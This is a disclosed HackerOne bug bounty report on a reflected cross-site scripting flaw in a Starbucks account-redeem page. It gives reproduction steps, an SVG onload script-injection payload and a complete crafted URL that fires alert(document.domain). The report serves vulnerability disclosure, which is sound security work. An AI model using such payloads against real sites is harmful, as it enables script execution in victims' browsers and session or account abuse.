# Reflected XSS in https://www.starbucks.com/account/create/redeem/MCP131XSR via xtl_amount, xtl_coupon_code, xtl_amount_type parameters

## Report Details
- **Report ID**: 531042
- **URL**: https://hackerone.com/reports/531042
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-04-08T09:45:51.256Z
- **Disclosed**: 2019-11-13T20:24:51.176Z

## Reporter
- **Username**: zayn1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
HI,

**Summary:** Reflected XSS 
**Description:**  the parameters are complementary to each other
**Platform(s) Affected:**  my browser firefox 52.7.3

## Steps To Reproduce:

   1. go to https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=81431&xtl_amount=0.0&xtl_amount_type=DOLLAR_VALUE
   1. change parameter `xtl_amount_type` to </script><svg/onload=alert()>` >note:if you  go enter this the payload not work but!!!!! you change `xtl_coupon_code` and `xtl_amount` payload will work
   1. change `xtl_coupon_code` and `xtl_amount` to any think 

   1.payload be like https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=hkjhkjh&xtl_amount=jhkjhj&xtl_amount_type=ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E
  
## Supporting Material/References:

 {F464214}


## How can the system be exploited with this bug?
  
The attacker can execute JS code.

## How did you come across this bug ?
change `xtl_coupon_code` and `xtl_amount` payload will work
In this bug the parameters are complementary to each other

## Recommendations for fix

In this bug the parameters are complementary to each other try to retreat

## Impact

* The attacker can execute JS code.

## Attachments
- zayn_xss.png
